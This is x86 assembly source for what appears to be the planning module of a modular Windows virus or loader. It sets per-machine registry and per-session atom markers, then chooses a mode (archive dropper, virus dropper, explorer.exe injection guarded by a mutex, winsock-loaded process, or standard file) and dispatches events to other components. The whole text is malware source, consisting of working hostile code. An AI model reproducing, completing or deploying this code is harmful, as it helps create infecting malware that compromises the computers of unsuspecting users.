
include                 PLAN.INC
include                 ..\..\INCLUDE\consts.inc
include                 ..\LDRWIN32\ldrwin32.inc
include                 ..\MAKEBODY\makebody.inc

                        public  HandleEvent

                        p386
                        model   flat
                        locals  __
                        jumps

                        .data

winsock                 db      'WSOCK32.DLL',0

explorer                db      'explorer.exe',0
explorer_mutex          db      8 dup (?),0
global_atom             db      8 dup (?),0

hKey                    dd      ?
argv0                   db      260 dup (?)

                        .code

send_event:             push    ecx             ; user_param
                        push    eax             ; event_id
                        callW   Event
                        add     esp, 8
                        retn

HandleEvent:            mov     eax, [esp+4]    ; event_id

                        cmp     eax, EV_LDRWIN32_STARTUP
                        je      __startup

__return_0:             xor     eax, eax
                        retn

__startup:

                        push    offset hKey
                        push    0DD5A5B7Dh      ; crc32('plan')
                        callW   openkeyV
                        or      eax, eax
                        jz      __close         ; success? -- close

                        mov     eax, EV_PLAN_PER_MACHINE
                        xor     ecx, ecx
                        call    send_event

                        or      eax, eax        ; somebody must handle it
                        jz      __close

                        push    offset hKey
                        push    0DD5A5B7Dh      ; crc32('plan')
                        callW   createkeyV

__close:                push    hKey
                        callW   closekey

                        ;;

                        push    0DD5A5B7Dh+1    ; crc32('plan')
                        push    8
                        push    offset global_atom
                        callW   uniquestr
                        add     esp, 3*4

                        push    offset global_atom
                        callW   GlobalFindAtomA
                        movzx   eax, ax    ; !!!
                        or      eax, eax
                        jnz     __skip1

                        mov     eax, EV_PLAN_PER_SESSION
                        xor     ecx, ecx
                        call    send_event

                        or      eax, eax        ; somebody must handle it
                        jz      __skip1

                        push    offset global_atom
                        callW   GlobalAddAtomA
__skip1:
                        push    DATOM_ARC
                        push    esp
                        callW   FindAtomA
                        pop     ecx
                        movzx   eax, ax    ; !!!
                        or      eax, eax
                        jz      __not_drop

                        mov     ecx, PLAN_ARCDROPPER
                        jmp     __sendevent
__not_drop:
                        push    DATOM_VIR
                        push    esp
                        callW   FindAtomA
                        pop     ecx
                        movzx   eax, ax    ; !!!
                        or      eax, eax
                        jz      __not_vir

                        mov     ecx, PLAN_VIRDROPPER
                        jmp     __sendevent
__not_vir:

                        call    get_argv0

                        push    offset argv0
                        push    offset explorer
                        callW   lstrcmpi
                        or      eax, eax
                        jz      __explorer

                        push    offset winsock
                        callW   GetModuleHandleA
                        or      eax, eax
                        jnz     __winsock

__stdfile:              mov     ecx, PLAN_STDFILE

__sendevent:            mov     eax, EV_PLAN_PER_PROCESS
                        call    send_event

                        and     eax, 1  ; -1 --> 1

                        retn

__explorer:
                        push    0DD5A5B7Dh+2    ; crc32('plan')
                        push    8
                        push    offset explorer_mutex
                        callW   uniquestr
                        add     esp, 3*4

                        push    offset explorer_mutex
                        push    0
                        push    0
                        callW   CreateMutexA
                        callW   GetLastError
                        or      eax, eax     ; alredy created?
                        jnz     __return_0

                        mov     ecx, PLAN_EXPLORER
                        jmp     __sendevent

__winsock:              mov     ecx, PLAN_WINSOCK
                        jmp     __sendevent

; action: fill argv0 variable with corresponding value;
;         only name.ext, without dir

get_argv0:              pusha
                        callW   GetCommandLineA
                        xchg    esi, eax
                        lea     edi, argv0
                        cld
                        lodsb
                        stosb
                        mov     ah, '"'         ; AH=terminator, 32 or "
                        cmp     al,  ah
                        je      __1
                        mov     ah, 32
__1:                    lodsb
                        cmp     al, '\'
                        jne     __2
                        lea     edi, argv0
                        jmp     __1
__2:                    cmp     al, ah
                        je      __3
                        or      al, al
                        jz      __3
                        stosb
                        jmp     __1
__3:                    xor     al,  al
                        stosb
                        popa
                        retn

                        end

